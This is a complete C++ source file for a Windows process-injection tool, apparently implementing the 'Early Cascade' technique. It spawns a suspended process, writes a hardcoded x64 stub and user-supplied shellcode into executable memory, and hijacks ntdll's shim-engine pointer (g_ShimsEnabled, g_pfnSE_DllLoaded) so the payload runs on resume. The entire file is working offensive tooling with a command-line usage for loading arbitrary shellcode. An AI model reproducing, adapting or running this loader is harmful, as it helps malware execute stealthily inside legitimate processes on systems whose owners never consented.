#include <windows.h>
#include <stdio.h>
#include <ntstatus.h>
#include <string>
#include <memory>
#include <vector>

struct Buffer {
    void* data;
    size_t size;

    Buffer() : data(nullptr), size(0) {}
    Buffer(void* ptr, size_t sz) : data(ptr), size(sz) {}
};

class ProcessInjector {
private:
    const std::vector<unsigned char> cascade_stub_x64 = {
        0x48, 0x83, 0xec, 0x38, 0x33, 0xc0, 0x45, 0x33, 0xc9, 0x48, 0x21, 0x44, 0x24, 0x20,
        0x48, 0xba, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0xa2, 0x99, 0x99, 0x99,
        0x99, 0x99, 0x99, 0x99, 0x99, 0x49, 0xb8, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,
        0x77, 0x48, 0x8d, 0x48, 0xfe, 0x48, 0xb8, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,
        0x66, 0xff, 0xd0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x38, 0xc3
    };

    void* getSectionBase(void* moduleBase, const std::string& sectionName) {
        auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(moduleBase);
        auto ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(moduleBase) + dosHeader->e_lfanew);
        auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            if (strncmp(sectionName.c_str(), reinterpret_cast<const char*>(sectionHeader[i].Name), sectionName.size()) == 0) {
                return reinterpret_cast<BYTE*>(moduleBase) + sectionHeader[i].VirtualAddress;
            }
        }
        return nullptr;
    }

    void* encodeFunctionPointer(void* fnPointer) {
        ULONG sharedUserCookie = *reinterpret_cast<ULONG*>(0x7FFE0330);
        return reinterpret_cast<void*>(_rotr64(sharedUserCookie ^ reinterpret_cast<UINT_PTR>(fnPointer), sharedUserCookie & 0x3F));
    }

public:
    NTSTATUS inject(const std::string& processPath, const Buffer& payload, const Buffer& context = {}) {
        if (processPath.empty() || !payload.data || payload.size == 0) {
            return STATUS_INVALID_PARAMETER;
        }

        PROCESS_INFORMATION pi = {};
        STARTUPINFOA si = {};
        si.cb = sizeof(si);

        if (!CreateProcessA(nullptr, const_cast<LPSTR>(processPath.c_str()), nullptr, nullptr, 
                           FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
            printf("[-] CreateProcessA Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        std::unique_ptr<void, decltype(&CloseHandle)> processGuard(pi.hProcess, CloseHandle);
        std::unique_ptr<void, decltype(&CloseHandle)> threadGuard(pi.hThread, CloseHandle);

        size_t totalSize = cascade_stub_x64.size() + payload.size + (context.data ? context.size : 0);
        auto remoteMemory = VirtualAllocEx(pi.hProcess, nullptr, totalSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!remoteMemory) {
            printf("[-] VirtualAllocEx Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        auto ntdll = GetModuleHandleA("ntdll.dll");
        auto mrdataSection = getSectionBase(ntdll, ".mrdata");
        auto dataSection = getSectionBase(ntdll, ".data");

        auto g_ShimsEnabled = reinterpret_cast<void*>(reinterpret_cast<UINT_PTR>(dataSection) + 0x6CF0);
        auto g_pfnSE_DllLoaded = reinterpret_cast<void*>(reinterpret_cast<UINT_PTR>(mrdataSection) + 0x270);

        printf("[*] g_ShimsEnabled   : %p\n", g_ShimsEnabled);
        printf("[*] g_pfnSE_DllLoaded: %p\n", g_pfnSE_DllLoaded);

        auto stubCopy = cascade_stub_x64;
        auto remotePayload = reinterpret_cast<UINT_PTR>(remoteMemory) + stubCopy.size();
        memcpy(&stubCopy[16], &remotePayload, sizeof(void*));

        memcpy(&stubCopy[25], &g_ShimsEnabled, sizeof(void*));

        auto remoteContext = context.data ? (remotePayload + payload.size) : 0;
        memcpy(&stubCopy[35], &remoteContext, sizeof(void*));

        auto ntQueueApcThread = GetProcAddress(ntdll, "NtQueueApcThread");
        memcpy(&stubCopy[49], &ntQueueApcThread, sizeof(void*));

        size_t offset = 0;
        if (!WriteProcessMemory(pi.hProcess, remoteMemory, stubCopy.data(), stubCopy.size(), nullptr)) {
            printf("[-] WriteProcessMemory Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        offset += stubCopy.size();
        if (!WriteProcessMemory(pi.hProcess, reinterpret_cast<BYTE*>(remoteMemory) + offset, payload.data, payload.size, nullptr)) {
            printf("[-] WriteProcessMemory Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        if (context.data) {
            offset += payload.size;
            if (!WriteProcessMemory(pi.hProcess, reinterpret_cast<BYTE*>(remoteMemory) + offset, context.data, context.size, nullptr)) {
                printf("[-] WriteProcessMemory Failed: %lu\n", GetLastError());
                return STATUS_UNSUCCESSFUL;
            }
        }

        BYTE trueValue = TRUE;
        if (!WriteProcessMemory(pi.hProcess, g_ShimsEnabled, &trueValue, sizeof(trueValue), nullptr)) {
            printf("[-] WriteProcessMemory Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        auto encodedPointer = encodeFunctionPointer(remoteMemory);
        if (!WriteProcessMemory(pi.hProcess, g_pfnSE_DllLoaded, &encodedPointer, sizeof(encodedPointer), nullptr)) {
            printf("[-] WriteProcessMemory Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        if (ResumeThread(pi.hThread) == -1) {
            printf("[-] ResumeThread Failed: %lu\n", GetLastError());
            return STATUS_UNSUCCESSFUL;
        }

        return STATUS_SUCCESS;
    }
};

class FileReader {
public:
    static Buffer readFile(const std::string& filename) {
        Buffer result;
        HANDLE file = CreateFileA(filename.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (file == INVALID_HANDLE_VALUE) {
            printf("[-] CreateFileA Failed: %lu\n", GetLastError());
            return result;
        }

        std::unique_ptr<void, decltype(&CloseHandle)> fileGuard(file, CloseHandle);

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(file, &fileSize)) {
            printf("[-] GetFileSizeEx Failed: %lu\n", GetLastError());
            return result;
        }

        result.size = static_cast<size_t>(fileSize.QuadPart);
        result.data = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, result.size);
        if (!result.data) {
            printf("[!] HeapAlloc Failed: %lu\n", GetLastError());
            return Buffer();
        }

        DWORD bytesRead;
        if (!ReadFile(file, result.data, static_cast<DWORD>(result.size), &bytesRead, nullptr) || bytesRead != result.size) {
            printf("[!] ReadFile Failed: %lu\n", GetLastError());
            HeapFree(GetProcessHeap(), 0, result.data);
            return Buffer();
        }

        return result;
    }
};

int main(int argc, char** argv) {
    if (argc <= 2) {
        printf("[-] Not enough arguments\n");
        printf("[*] Example: %s [process.exe] [shellcode.bin]\n", argv[0]);
        return -1;
    }

    auto payload = FileReader::readFile(argv[2]);
    if (!payload.data || payload.size == 0) {
        printf("[-] Failed to read file %s\n", argv[2]);
        return -1;
    }

    printf("[*] Process: %s\n", argv[1]);
    printf("[*] Payload @ %p [%zu bytes]\n", payload.data, payload.size);

    ProcessInjector injector;
    injector.inject(argv[1], payload);

    printf("[*] Finished\n");
    HeapFree(GetProcessHeap(), 0, payload.data);

    return 0;
}
